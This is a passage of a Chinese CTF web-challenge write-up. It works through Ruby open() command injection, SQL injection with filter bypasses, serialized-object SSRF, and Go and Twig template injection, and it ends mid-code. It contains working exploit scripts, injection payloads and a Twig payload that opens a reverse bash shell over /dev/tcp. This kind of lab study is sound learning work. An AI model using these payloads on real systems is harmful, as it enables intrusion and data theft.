class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;digest&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;base64&#x27;</span><br><br>get <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/index.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&#x27;/upload&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/upload.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&#x27;/upload&#x27;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:file</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:tempfile</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;png&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">begin</span><br>    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>]) + <span class="hljs-string">&#x27;.png&#x27;</span><br>    open(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) &#123; <span class="hljs-params">|f|</span><br>      f.write open(params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:tempfile</span>],<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    &#125;<br>    <span class="hljs-string">&quot;Upload success, file stored at <span class="hljs-subst">#&#123;filename&#125;</span>&quot;</span><br>  <span class="hljs-keyword">rescue</span><br>    <span class="hljs-string">&#x27;something wrong&#x27;</span><br>  <span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&#x27;/convert&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/convert.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&#x27;/convert&#x27;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">begin</span><br>    <span class="hljs-keyword">unless</span> params[<span class="hljs-string">&#x27;file&#x27;</span>]<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span><br>    <span class="hljs-keyword">end</span><br><br>    file = params[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">unless</span> file.index(<span class="hljs-string">&#x27;..&#x27;</span>) == <span class="hljs-literal">nil</span> &amp;&amp; file.index(<span class="hljs-string">&#x27;/&#x27;</span>) == <span class="hljs-literal">nil</span> &amp;&amp; file =~ <span class="hljs-regexp">/^(.+)\.png$/</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span><br>    <span class="hljs-keyword">end</span><br>    res = open(file, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    headers <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span><br>    <span class="hljs-string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="hljs-regexp">/\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&quot;\&quot;;\n&quot;</span><br>  <span class="hljs-keyword">rescue</span><br>    <span class="hljs-string">&#x27;something wrong&#x27;</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>可以发现在convert和upload处都调用了open，因此我们只使用convert这个路由，先注入命令，由于存在可以读取文件的路由，我们直接将执行结果写入文件，再读取编码后的文件。</p><p>对于rce命令的过滤，我们利用base64编码绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject</span>():</span><br>    <span class="hljs-keyword">global</span> url,rce_data<br>    cmd = <span class="hljs-string">&quot;ls /&quot;</span><br>    en_cmd = base64.b64encode(cmd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <br>    data = rce_data<br>    data[<span class="hljs-string">&#x27;file&#x27;</span>] = data[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-built_in">format</span>(en_cmd)<br>    r = requests.post(url=url,data = data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">global</span> url,read_data<br>    r = requests.post(url=url,data=read_data)<br>    en_text = r.text.split(<span class="hljs-string">&#x27;base64,&#x27;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(base64.b64decode(en_text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://1.14.71.254:28087/convert&quot;</span><br>    rce_data = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;| `echo &#x27;&#123;&#125;&#x27; | base64 -d` &gt; 1.png&quot;</span><br>    &#125;<br>    read_data = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;1.png&quot;</span><br>    &#125;<br>    inject()<br>    read()<br></code></pre></td></tr></table></figure><h2 id="sql注入">3、SQL注入</h2><h3 id="nisa-hardsqlquine技术">1、NISA-hardsql（quine技术）</h3><p>这道题上来就先给了sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="hljs-subst">$password</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>首先是fuzz一下，发现空格过不了，or没有被屏蔽，于是可以构造语句如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/**/or/**/passwd/**/like/**/&#x27;&#x27;#</span><br></code></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28150/login.php&quot;</span><br><br><span class="hljs-comment"># username=bilala&amp;passwd=-1&#x27;/**/or/**/passwd/**/like/**/&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;#</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;bilala&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;&#x27;#&quot;</span><br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>loop = <span class="hljs-literal">True</span><br><span class="hljs-keyword">while</span> loop:<br>    loop = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(i) == <span class="hljs-string">&#x27;%&#x27;</span>):<br>            <span class="hljs-keyword">continue</span><br>        data[<span class="hljs-string">&#x27;passwd&#x27;</span>] = <span class="hljs-string">&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#&quot;</span>.<span class="hljs-built_in">format</span>(flag + <span class="hljs-built_in">chr</span>(i) )<br><br>        r = requests.post(url=url,proxies=proxies,data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag += <span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            loop = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>但是这样是有风险的，因为你没有对username做限制，直接passwd可能会爆破出来别的用户的密码（那只能limit试过去了。</p><p>于是进入之后可以得到源代码，接下来才进入quine的正题。</p><p>这里先附上两篇分析：</p><p>https://www.cnblogs.com/zhengna/p/15917521.html</p><p>https://www.anquanke.com/post/id/253570</p><h3 id="nssctfez_sql报错注入联合注入">2、NSSCTF—ez_sql（报错注入&amp;&amp;联合注入）</h3><p>这道题一度把我引入了布尔盲注，最后发现其实还是对于waf的探测不够准确。</p><p>首先，上来传参为1，这个得到的flag肯定是假的。</p><p>尝试了2,3等就没有了结果。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164252562.png" alt="image-20230401164252562" /></p><p>尝试引号闭合以及#闭合，发现仍然正常显示</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164448420.png" alt="image-20230401164448420" /></p><p>尝试使用union联合注入，通过报错发现select 1,2间的引号不见了，怀疑是被过滤了，则使用/**/绕过</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164612299.png" alt="image-20230401164612299" /></p><p>但是绕过之后发现依然不能够完成攻击，这时候怀疑可能还有其他的过滤，测试之下发现果然存在union被过滤了。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401164839225.png" alt="image-20230401164839225" /></p><p>就这样一步步测试下去，最后使用联合注入成功拿到flag，也是非常地心累。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_payload</span>(<span class="hljs-params">payload</span>):</span><br>    new_payload = payload<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;/**/&quot;</span>)<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot;or&quot;</span>,<span class="hljs-string">&quot;oorr&quot;</span>)<br>    new_payload = new_payload.replace(<span class="hljs-string">&quot;union&quot;</span>,<span class="hljs-string">&quot;ununionion&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> new_payload<br><br><br>url = <span class="hljs-string">&quot;http://43.142.108.3:28124/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_database</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,database()#&quot;</span>)<br>                     &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_tables</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_columns</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;NSS_tb&#x27;#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_all_content</span>():</span><br>    r = requests.post(url = url,<br>                     data = &#123;<br>                        <span class="hljs-string">&quot;nss&quot;</span>:process_payload(<span class="hljs-string">&quot;2&#x27; union select 1,2,group_concat(concat_ws(&#x27;:&#x27;,id,Secr3t,flll444g)) from NSS_tb#&quot;</span>)<br>                    &#125;)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># get_database()</span><br>    <span class="hljs-comment"># get_all_tables()  NSS_tb,users</span><br>    <span class="hljs-comment"># get_all_columns() id,Secr3t,flll444g</span><br>    get_all_content()<br><br><br></code></pre></td></tr></table></figure><h3 id="suctfeasysqlsql_mode">3、2019SUCTF—EasySQL（sql_mode）</h3><p>这道题算是非常tricky的题目了，最重要的是要分析出背后的SQL语句。</p><p>首先是发现对于WAF中的数字会回显Nonono，这就非常有意思了。</p><p>先来一手SQL注入的FUZZ，发现屏蔽了大多数，但是没有屏蔽<code>||</code>，我直接来了一手布尔盲注。注出来数据库名之后发现限制长度了，于是这条路就断了。</p><p>于是分析SQL语句的返回结果，不是0就是1，那么意味着我们拼接的内容很有可能就是一个布尔表达式。</p><p>于是尝试</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure><p>发现直接得到了flag。</p><p>最后查看wp发现，真正的SQL语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &#123;&#125; <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure><p>在默认情况下，<code>||</code>在SQL语句中表示或，但是可以开启连接模式，官方的WP也是这么做的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure><p>最后成功拿到flag，存在堆叠注入我还没意识到orz。</p><h3 id="网鼎facebooksql查询结果反序列化">4、2018网鼎—FaceBook（sql查询结果反序列化）</h3><p>这道题考察的知识点相对还是比较全面的。</p><p>进入之后，存在一个登录界面和注册界面，尝试注册发现blog参数一直显示无效。</p><p>dirsearch扫描目录之后发现存在<code>robots.txt</code>，查看后发现存在<code>user.php</code></p><p>通过<code>user.php</code>找了blog的检查函数，从而成功注册。</p><p>注册之后，可以进入view.php查看对应的blog，发现url中的参数no可以注入。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001608480.png" alt="image-20230402001608480" /></p><p>尝试联合注入，union select被过滤，利用/**/绕过即可</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001734334.png" alt="image-20230402001734334" /></p><p>发现可以利用参数2进行回显，于是进一步表，列以及数值。</p><p>爆出数据如下，观察数据发现并不存在直接的blog数据存储，而是将user的信息以反序列化的形式存储在数据库。</p><p>那么也就意味着我们利用联合注入修改查询到的反序列化数据，就可以实现SSRF访问内网数据（注意此时的blog可以不考虑最初的url限制）。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230402001913349.png" alt="image-20230402001913349" /></p><p>经过测试发现，data数据是对应的第四项，由此构造对应的payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">43.143.7.97:28965</span>//view.php?no=<span class="hljs-number">3</span>%<span class="hljs-number">20</span>union/**/select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,(select &#x27;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>\;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;admin4&quot;</span>\;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>\;i:<span class="hljs-number">20</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>\;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>\;&#125;&#x27;);#<br></code></pre></td></tr></table></figure><p>成功读取到flag。</p><p>补充，显示的内容会以base64形式编码，需要解码后获取。</p><h2 id="ssti">4、SSTI</h2><h3 id="sctf-loginmexff漏洞go模板注入">1、SCTF-loginme（XFF漏洞/Go模板注入）</h3><p>上来先是一个很明显的XFF</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154514295.png" alt="image-20220816154514295" style="zoom:50%;" /></p><p>关键点在于ClientIP的实现，好在我们可以找到ClientIP的实现，除了xff头，还存在X-Real-IP这个利用点。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ClientIP 尽最大努力实现获取客户端 IP 的算法。</span><br><span class="hljs-comment">// 解析 X-Real-IP 和 X-Forwarded-For 以便于反向代理（nginx 或 haproxy）可以正常工作。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ClientIP</span><span class="hljs-params">(r *http.Request)</span> <span class="hljs-title">string</span></span> &#123;<br>xForwardedFor := r.Header.Get(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br>ip := strings.TrimSpace(strings.Split(xForwardedFor, <span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> ip<br>&#125;<br>ip = strings.TrimSpace(r.Header.Get(<span class="hljs-string">&quot;X-Real-Ip&quot;</span>))<br><span class="hljs-keyword">if</span> ip != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> ip<br>&#125;<br><span class="hljs-keyword">if</span> ip, _, err := net.SplitHostPort(strings.TrimSpace(r.RemoteAddr)); err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> ip<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>出现了这样的页面，用于显示用户信息。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816154908285.png" alt="image-20220816154908285" style="zoom:50%;" /></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Login</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>idString, flag := c.GetQuery(<span class="hljs-string">&quot;id&quot;</span>)<br><span class="hljs-keyword">if</span> !flag &#123;<br>idString = <span class="hljs-string">&quot;1&quot;</span><br>&#125;<br>id, err := strconv.Atoi(idString)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>id = <span class="hljs-number">1</span><br>&#125;<br>TargetUser := structs.Admin<br><span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> structs.Users &#123;<br><span class="hljs-keyword">if</span> user.Id == id &#123;<br>TargetUser = user<br>&#125;<br>&#125;<br><br>age := TargetUser.Age<br><span class="hljs-keyword">if</span> age == <span class="hljs-string">&quot;&quot;</span> &#123;<br>        <span class="hljs-comment">//*******************</span><br>        <span class="hljs-comment">//这里有age的注入点</span><br>        <span class="hljs-comment">//********************</span><br>age, flag = c.GetQuery(<span class="hljs-string">&quot;age&quot;</span>)<br><span class="hljs-keyword">if</span> !flag &#123;<br>age = <span class="hljs-string">&quot;forever 18 (Tell me the age)&quot;</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithError(<span class="hljs-number">500</span>, err)<br>&#125;<br><br>html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithError(<span class="hljs-number">500</span>, err)<br>&#125;<br><br>tmpl, err := template.New(<span class="hljs-string">&quot;admin_index&quot;</span>).Parse(html)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithError(<span class="hljs-number">500</span>, err)<br>&#125;<br><br>tmpl.Execute(c.Writer, TargetUser)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现源代码中在age这个点有渲染，同时我们可以找到age的注入点，猜测是不是go有SSTI。</p><p><a href="https://tyskill.github.io/posts/gossti">GO SSTI初探</a></p><p>于是照着文章里尝试看看能不能打出admin的Password，顺利拿到flag。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" alt="image-20220816155906990" /></p><h3 id="bjdctf-cookie-stubletwig模板注入">2、BJDCTF-Cookie stuble（twig模板注入）</h3><p>打开界面，Hint提示看一下Cookies，同时发现前端会动态显示用户名</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/%5BT8KS0BQQGOGD8O0I2H05GU.png" alt="img" style="zoom:50%;" /></p><p>怀疑是PHP模板注入，测试了smarty的payload，发现不行</p><p>于是尝试了twig的payload，发现能够成功，于是反弹shell，拿下flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="xxe">5、XXE</h2><h3 id="nctf-xml-cookbook">1、NCTF-XML cookbook</h3><h3 id="网鼎20-filejava目录穿越excel-xxe">2、网鼎20-FileJava（目录穿越/Excel XXE）</h3><p>文件上传之后出现下载链接，发现可能存在任意文件读取目录</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150221722.png" alt="image-20220816150221722" style="zoom:50%;" /></p><p>尝试读取根目录的<code>/etc/passwd</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816150356769.png" alt="image-20220816150356769" style="zoom:50%;" /></p><p>接下来尝试获取目录，我们利用500报错获取网站部署的路径。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151222621.png" alt="image-20220816151222621" style="zoom:50%;" /></p><p>接下来尝试获取网站的路由信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816151522399.png" alt="image-20220816151522399" style="zoom:50%;" /></p><p>拉到路由之后，我们直接试试能不能利用Download的接口下载到class文件，从而反编译获得源代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 